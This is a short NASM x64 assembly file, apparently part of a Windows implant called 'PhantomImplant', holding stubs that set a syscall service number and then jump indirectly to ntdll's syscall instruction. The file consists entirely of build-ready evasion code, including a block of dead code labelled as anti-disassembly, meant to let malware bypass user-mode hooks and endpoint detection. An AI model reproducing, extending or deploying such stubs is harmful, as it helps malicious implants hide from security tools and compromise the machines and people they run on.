; PhantomImplant - Indirect Syscall Assembly Stubs (NASM x64 Win64)
;
; SetSSn:     Saves SSN + syscall instruction address
; RunSyscall: Executes via indirect jmp to ntdll's syscall instruction
;
; Build: nasm -f win64 asm/syscalls.asm -o build/syscalls.obj

BITS 64
DEFAULT REL

section .data
    global wSystemCall
    global qSyscallInsAddress

    wSystemCall:        dd 0x0000
    qSyscallInsAddress: dq 0x0000000000000000

section .text
    global SetSSn
    global RunSyscall

; =============================================
; SetSSn(DWORD dwSSn, PVOID pSyscallInstAddress)
; RCX = SSN, RDX = address of syscall instruction in ntdll
; =============================================
SetSSn:
    xor eax, eax
    mov [rel wSystemCall], eax
    mov [rel qSyscallInsAddress], rax
    mov eax, ecx                        ; eax = SSN
    mov [rel wSystemCall], eax
    mov r8, rdx                         ; r8 = syscall inst address
    mov [rel qSyscallInsAddress], r8
    ret

; =============================================
; RunSyscall(params...)
; Executes indirect syscall - params passed via Windows x64 ABI
; RCX = param1, RDX = param2, R8 = param3, R9 = param4, stack = rest
; =============================================
RunSyscall:
    xor r10, r10
    mov rax, rcx                        ; save first param
    mov r10, rax                        ; r10 = rcx (syscall ABI)
    mov eax, [rel wSystemCall]          ; eax = SSN
    jmp .Run
    ; dead code (anti-disassembly)
    xor eax, eax
    xor rcx, rcx
    shl r10, 2
.Run:
    jmp [rel qSyscallInsAddress]        ; INDIRECT: jmp to ntdll's syscall instruction
    xor r10, r10
    mov [rel qSyscallInsAddress], r10   ; cleanup
    ret
